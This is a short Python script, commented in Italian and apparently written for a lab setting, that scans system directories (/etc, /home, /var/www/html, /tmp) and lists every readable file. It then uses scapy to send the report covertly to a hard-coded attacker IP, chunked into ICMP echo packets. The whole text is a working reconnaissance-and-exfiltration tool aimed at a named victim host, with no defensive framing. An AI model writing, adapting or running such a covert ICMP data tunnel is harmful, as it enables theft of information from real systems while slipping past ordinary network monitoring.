import os
import time
from scapy.all import IP, ICMP, send, conf

ATTACKER_IP = "192.168.66.66"
MY_IFACE = "enp0s3"

conf.iface = MY_IFACE
conf.verb = 0

TARGET_DIRS = ["/etc", "/home", "/var/www/html", "/tmp"]

def get_system_file_report():
    """Genera la lista dei file trovati sul sistema"""
    report = f"--- REPORT SCANSIONE AUTOMATICA ---\n"
    report += f"Vittima IP: 10.0.10.100 (Interfaccia: {MY_IFACE})\n"
    report += "-" * 30 + "\n"

    for directory in TARGET_DIRS:
        if not os.path.exists(directory): continue
            
        try:
            for root, dirs, files in os.walk(directory):
                for name in files:
                    full_path = os.path.join(root, name)
                    if os.access(full_path, os.R_OK):
                        report += f"[OPEN] {full_path}\n"
                    else:
                        # report += f"[LOCK] {full_path}\n"
                        pass
        except:
            pass
    
    report += "--- FINE SCANSIONE ---"
    return report

def exfiltrate(destination_ip, data):
    """Spedisce i dati via ICMP"""
    print(f"[DEBUG] Invio report di {len(data)} bytes via {conf.iface}...")
    payload = data.encode('utf-8', errors='ignore')
    chunk_size = 32

    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i+chunk_size]
        pkt = IP(dst=destination_ip)/ICMP(type=8, id=9999)/chunk
        send(pkt)
        time.sleep(0.02) 

    send(IP(dst=destination_ip)/ICMP(type=8, id=9999)/"EOF")
    print("[DEBUG] Invio completato!")

if __name__ == "__main__":
    print("[*] Avvio scansione file...")
    secret_data = get_system_file_report()
    exfiltrate(ATTACKER_IP, secret_data)